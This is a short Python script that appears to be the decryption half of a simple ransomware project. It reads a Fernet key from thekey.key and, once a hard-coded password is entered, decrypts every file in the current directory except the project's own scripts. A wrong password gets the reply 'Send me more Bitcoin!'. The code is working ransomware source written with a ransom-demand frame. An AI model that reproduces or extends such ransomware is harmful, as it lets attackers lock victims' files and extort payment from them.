#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

# Secret phrase
password = "omal"

user_phrase = input("Enter the password  to decrypt your files:\n")

if user_phrase == password:
    # Get list of files to decrypt
    files = []
    for file in os.listdir():
        if file in ["encrypt.py", "decrypt.py", "thekey.key"]:
            continue
        if os.path.isfile(file):
            files.append(file)

    # Load the key
    with open("thekey.key", "rb") as thekey:
        secret_key = thekey.read()

    # Decrypt files
    for file in files:
        with open(file, "rb") as f:
            contents = f.read()
        contents_decrypted = Fernet(secret_key).decrypt(contents)
        with open(file, "wb") as f:
            f.write(contents_decrypted)

    print("Congrats! Your files are decrypted.")
else:
    print("Sorry. Wrong secret phrase. Send me more Bitcoin! 💰")
